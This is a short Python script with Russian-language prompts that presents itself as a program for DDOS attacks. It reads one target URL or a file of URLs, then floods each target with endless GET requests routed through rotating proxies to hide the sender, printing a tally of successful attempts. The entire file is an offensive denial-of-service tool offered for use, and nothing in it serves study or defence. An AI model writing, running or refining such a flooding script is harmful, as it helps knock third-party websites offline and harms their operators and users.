import requests
import time
import fake_proxy
import socket

'''Вступление'''
print('Добро пожаловать в программу для DDOS атак')

'''Импорт прокси адресов'''
# with open(r'proxies.txt') as f:
# 	content = f.read()
# proxies = content.split('\n')

file = input('Введите URL адрес сайта или перетащите файл с адресами:\n')
try:
	with open(file) as f:
		content = f.read()
	URL = content.split('\n')
except FileNotFoundError:
	URL = [file]

def responser(URL, proxy):
	response = requests.get(URL, proxies = proxy)
	if response.status_code == 200:
		return True
	else:
		print(URL, response.status_code)
		return False

'''Запросы'''
for k in URL:
	i = 1
	if 'https://' not in k:
		URL = 'https://' + k
	while True:
		try:
			proxy = fake_proxy.get(proxy_type = 'https')[0]
			if responser(URL, proxy):
				print(URL,  'Всё прошло успешно, попытка №{}\r'.format(i), end = '\r')
				i += 1
				continue
			else:
				break
		except requests.exceptions.InvalidURL:
			URL = 'http://' + k
			proxy = fake_proxy.get(proxy_type = 'http')[0]
			responser(URL, proxy)
		except ConnectionError:
			print('Ошибка соединения\r')